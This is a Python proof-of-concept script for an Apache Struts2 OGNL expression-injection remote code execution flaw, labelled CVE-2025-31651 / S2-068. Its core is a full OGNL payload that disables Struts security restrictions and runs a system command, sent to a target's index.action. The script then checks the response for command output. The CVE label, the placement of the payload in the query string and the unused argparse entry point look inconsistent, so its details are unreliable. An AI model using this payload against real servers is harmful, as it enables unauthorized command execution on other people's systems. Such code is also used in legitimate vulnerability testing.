#!/usr/bin/env python3
# coding:utf-8
import requests
import argparse
import sys
import urllib.parse

def poc(url):
    """
    PoC for CVE-2025-31651 (Struts2 S2-068): OGNL Expression Injection RCE
    Sends a malicious OGNL payload to execute a command and checks for response.
    """
    try:
        # Ensure URL ends with a known Struts2 action (adjust based on target)
        target_url = url.rstrip("/") + "/index.action"

        # OGNL payload for CVE-2025-31651 to execute 'id' command
        payload = (
            "%{(#_='multipart/form-data')."
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(#_memberAccess?(#_memberAccess=#dm):"
            "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            "(#ognlUtil.getExcludedPackageNames().clear())."
            "(#ognlUtil.getExcludedClasses().clear())."
            "(#context.setMemberAccess(#dm))))."
            "(#cmd='id')."
            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            "(#p=new java.lang.ProcessBuilder(#cmds))."
            "(#p.redirectErrorStream(true))."
            "(#process=#p.start())."
            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            "(#ros.flush())}"
        )

        # URL-encode the payload
        encoded_payload = urllib.parse.quote(payload)

        # Construct the malicious URL
        malicious_url = f"{target_url}?{encoded_payload}"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Connection": "close"
        }

        print(f"[*] 测试 CVE-2025-31651 漏洞: {url}")
        print(f"[*] 发送 payload 到: {malicious_url}")

        # Send the request
        response = requests.get(malicious_url, headers=headers, timeout=10, allow_redirects=False)

        # Check for signs of command execution (e.g., 'uid=' for 'id' command)
        if response.status_code == 200 and "uid=" in response.text:
            print(f"[+] [{url}] 可能存在 CVE-2025-31651 漏洞！")
            print(f"[+] 响应包含命令输出: {response.text[:100]}...")
            return True
        else:
            print(f"[-] [{url}] 未检测到 CVE-2025-31651 漏洞（状态码: {response.status_code}）")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] 测试失败: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-31651 (Struts2 S2-068 RCE)")
    parser.add_argument("--url", required=True, help="目标 Struts2 应用 URL（例如 http://example.com:8080）")
    args = parser.parse_args()

    result = poc(args.url)
    if result:
        print(f"[*] 建议升级 Apache Struts2 到 2.5.33、6.4.1 或更高版本。")
        print(f"[*] 参考: https://avd.aliyun.com/detail?id=AVD-2025-31651")


if __name__ == '__main__':
    url = "http://127.0.0.1:8080"
    poc(url)
